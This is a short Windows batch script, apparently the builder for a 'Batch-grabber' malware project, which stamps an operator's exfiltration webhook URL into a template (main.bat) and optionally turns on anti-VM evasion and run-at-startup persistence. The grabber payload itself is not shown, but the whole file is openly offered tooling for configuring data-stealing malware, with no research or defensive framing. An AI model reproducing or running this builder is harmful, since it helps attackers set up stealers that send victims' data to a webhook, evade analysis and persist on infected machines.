@echo off
title https://github.com/FogmaLOL/Batch-grabber
setlocal enabledelayedexpansion

echo ------------------------------ FogmaLol's Builder ------------------------------
echo.
echo Available options:
echo [1] Anti-VM
echo [2] Start on startup
echo.
set /p "webhook=Enter your webhook URL: "
set /p "antiVM=Do you want to enable Anti-VM? (Y/N): "
set /p "startOnStartup=Do you want the script to start on startup? (Y/N): "

(for /F "usebackq delims=" %%G in ("main.bat") do (
    set "line=%%G"
    set "line=!line:UR WEBHOOK=%webhook%!"
    set "line=!line:antiVM=false=antiVM=%antiVM%!"
    set "line=!line:startOnStartup=false=startOnStartup=%startOnStartup%!"
    echo !line!
)) > "Lol.bat"

echo Lol.bat created successfully with the updated options.
pause
